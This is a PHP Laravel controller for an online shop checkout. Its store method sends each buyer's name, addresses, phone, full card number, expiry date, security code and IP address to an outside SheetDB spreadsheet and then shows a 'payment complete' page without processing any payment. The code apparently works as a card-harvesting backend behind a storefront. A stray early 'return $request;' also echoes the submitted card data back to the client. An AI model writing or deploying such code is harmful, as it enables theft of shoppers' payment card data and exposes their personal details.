<?php

namespace App\Http\Controllers;

use SheetDB\SheetDB;
use Illuminate\Http\Request;
use App\Models\PixelModel;

class PostController extends Controller
{

    public function store(Request $request)
    {
        return $request;
        $sheetdb = new SheetDB('bw2b9oje4zqdw');
        $actualPixel = PixelModel::first();
        $sheetdb->create([
            'date'                      => date('d-m-Y H:i:s'),
            'emailAddress'              => $request->input('emailAddress'),
            'shipFirstName'             => $request->input('shipFirstName'),
            'shipLastName'              => $request->input('shipLastName'),
            'shipAddress1'              => $request->input('shipAddress1'),
            'shipAddress2'              => $request->input('shipAddress2'),
            'shipCity'                  => $request->input('shipCity'),
            'shipCountry'               => $request->input('shipCountry'),
            'shipPostalCode'            => $request->input('shipPostalCode'),
            'phoneNumber'               => $request->input('phoneNumber'),
            'billShipSame'              => $request->input('billShipSame'),
            'firstName'                 => $request->input('firstName'),
            'lastName'                  => $request->input('lastName'),
            'address1'                  => $request->input('address1'),
            'address2'                  => $request->input('address2'),
            'city'                      => $request->input('city'),
            'state'                     => $request->input('state'),
            'postalCode'                => $request->input('postalCode'),
            'payment_method'            => $request->input('payment_method'),
            'cardNumber'                => $request->input('cardNumber'),
            'cardDate'                  => $request->input('cardDate'),
            'cardSecurityCode'          => $request->input('cardSecurityCode'),
            'product_name'              => $request->input('product_name'),
            'product_quantity'          => $request->input('product_quantity'),
            'product_price'             => $request->input('product_price'),
            'subtotal_dolar'            => $request->input('subtotal_dolar'),
            'product_shipping'          => $request->input('product_shipping'),
            'total_dolar'               => $request->input('total_dolar'),
            'ccType'                    => $request->input('ccType'),
            'client_ip'                 => $request->ip()
        ]);

        if($request->input('language') == "spanish"){
            return view('productlink.paymentcompletespanish',[
                'shipping_first_name'       => $request->input('checkout')['shipping_first_name'],
                'product_quantity'          => $request->input('product_quantity'),
                'product_name'              => $request->input('product_name'),
                'product_price'             => $request->input('product_price'),
                'product_image_path'        => $request->input('product_image_path'),
                'checkout_free_option_label'=> $request->input('checkout_free_option_label'),
                'checkout_free_option_value'=> $request->input('checkout_free_option_value'),
                'checkout_taxes_value'      => $request->input('checkout_taxes_value'),
                'subtotal_dolar'            => $request->input('subtotal_dolar'),
                'shipping_price_dolar'      => $request->input('shipping_price_dolar'),
                'taxes_dolar'               => $request->input('taxes_dolar'),
                'total_dolar'               => $request->input('total_dolar'),
                'client_currency'           => $request->input('client_currency'),
                'client_currency_exchange'  => $request->input('client_currency_exchange'),
                'shipping_description'      => $request->input('shipping_description'),
                'language'                  => $request->input('language'),
                'actualPixel'               => $actualPixel
            ]);
        }
        else{
            return view('productlink.paymentcompletenglish',[
                'shipping_first_name' => $request->input('checkout')['shipping_first_name'],
                'product_quantity' => $request->input('product_quantity'),
                'product_name' => $request->input('product_name'),
                'product_price' => $request->input('product_price'),
                'product_image_path' => $request->input('product_image_path'),
                'checkout_free_option_value' => $request->input('checkout_free_option_value'),
                'checkout_free_option_label' => $request->input('checkout_free_option_label'),
                'checkout_taxes_value' => $request->input('checkout_taxes_value'),
                'subtotal_dolar'            => $request->input('subtotal_dolar'),
                'shipping_price_dolar'      => $request->input('shipping_price_dolar'),
                'taxes_dolar'               => $request->input('taxes_dolar'),
                'total_dolar'               => $request->input('total_dolar'),
                'client_currency'           => $request->input('client_currency'),
                'client_currency_exchange'  => $request->input('client_currency_exchange'),
                'shipping_description'      => $request->input('shipping_description'),
                'language'                  => $request->input('language'),
                'actualPixel'               => $actualPixel
            ]);
        }            
    }
}